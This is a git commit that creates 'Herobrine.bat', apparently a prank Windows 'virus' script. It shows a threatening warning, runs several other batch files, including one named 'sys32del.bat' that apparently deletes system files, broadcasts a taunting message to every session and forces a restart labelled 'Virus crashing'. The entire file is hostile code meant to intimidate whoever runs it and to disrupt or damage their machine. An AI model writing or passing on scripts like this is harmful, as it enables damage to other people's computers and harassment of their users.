cef1871c057187c8df1f4241cfdd56013921129e
HerobrinePE <42194169+HerobrinePE@users.noreply.github.com>
2018-12-17 21:48:57 -0400

    Create Herobrine.bat

---
+++ Herobrine.bat
@@ -0,0 +1,12 @@
+@echo off
+title Warning
+color 12
+echo Exit or die
+pause
+File.bat
+hakk.bat
+Null.bat
+hsbthg836676hshjut^^^^^^^^²¹.bat
+msg * any last words to your pc because you didnt listen to my warning
+sys32del.bat
+shutdown -r -t 180 -c "Virus crashing"
